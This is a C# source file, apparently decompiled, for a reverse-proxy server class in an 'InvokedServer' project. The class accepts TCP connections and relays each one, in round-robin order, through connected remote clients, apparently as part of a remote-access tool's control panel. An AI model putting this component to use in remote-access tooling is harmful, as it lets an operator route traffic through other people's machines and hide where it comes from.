

using InvokedServer.Networking;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace InvokedServer.ReverseProxy
{
	public class ReverseProxyServer
	{
		private Socket _socket;
		private readonly List<ReverseProxyClient> _clients;
		private uint _clientIndex;

		public event ReverseProxyServer.ConnectionEstablishedCallback OnConnectionEstablished;

		public event ReverseProxyServer.UpdateConnectionCallback OnUpdateConnection;

		public ReverseProxyClient[] ProxyClients
		{
			get
			{
				lock (this._clients)
					return this._clients.ToArray();
			}
		}

		public ReverseProxyClient[] OpenConnections
		{
			get
			{
				lock (this._clients)
				{
					List<ReverseProxyClient> reverseProxyClientList = new List<ReverseProxyClient>();
					for (int index = 0; index < this._clients.Count; ++index)
					{
						if (this._clients[index].ProxySuccessful)
							reverseProxyClientList.Add(this._clients[index]);
					}
					return reverseProxyClientList.ToArray();
				}
			}
		}

		public Client[] Clients { get; private set; }

		public ReverseProxyServer() => this._clients = new List<ReverseProxyClient>();

		public void StartServer(Client[] clients, string ipAddress, ushort port)
		{
			this.Stop();
			this.Clients = clients;
			this._socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
			this._socket.Bind((EndPoint)new IPEndPoint(IPAddress.Parse(ipAddress), (int)port));
			this._socket.Listen(100);
			this._socket.BeginAccept(new AsyncCallback(this.AsyncAccept), (object)null);
		}

		private void AsyncAccept(IAsyncResult ar)
		{
			try
			{
				lock (this._clients)
				{
					this._clients.Add(new ReverseProxyClient(this.Clients[(long)this._clientIndex % (long)this.Clients.Length], this._socket.EndAccept(ar), this));
					++this._clientIndex;
				}
			}
			catch
			{
			}
			try
			{
				this._socket.BeginAccept(new AsyncCallback(this.AsyncAccept), (object)null);
			}
			catch
			{
			}
		}

		public void Stop()
		{
			if (this._socket != null)
			{
				this._socket.Close();
				this._socket = (Socket)null;
			}
			lock (this._clients)
			{
				foreach (ReverseProxyClient reverseProxyClient in new List<ReverseProxyClient>((IEnumerable<ReverseProxyClient>)this._clients))
					reverseProxyClient.Disconnect();
				this._clients.Clear();
			}
		}

		public ReverseProxyClient GetClientByConnectionId(int connectionId)
		{
			lock (this._clients)
				return this._clients.FirstOrDefault<ReverseProxyClient>((Func<ReverseProxyClient, bool>)(t => t.ConnectionId == connectionId));
		}

		internal void CallonConnectionEstablished(ReverseProxyClient proxyClient)
		{
			try
			{
				if (this.OnConnectionEstablished == null)
					return;
				this.OnConnectionEstablished(proxyClient);
			}
			catch
			{
			}
		}

		internal void CallonUpdateConnection(ReverseProxyClient proxyClient)
		{
			try
			{
				if (!proxyClient.IsConnected)
				{
					lock (this._clients)
					{
						for (int index = 0; index < this._clients.Count; ++index)
						{
							if (this._clients[index].ConnectionId == proxyClient.ConnectionId)
							{
								this._clients.RemoveAt(index);
								break;
							}
						}
					}
				}
			}
			catch
			{
			}
			try
			{
				if (this.OnUpdateConnection == null)
					return;
				this.OnUpdateConnection(proxyClient);
			}
			catch
			{
			}
		}

		public delegate void ConnectionEstablishedCallback(ReverseProxyClient proxyClient);

		public delegate void UpdateConnectionCallback(ReverseProxyClient proxyClient);
	}
}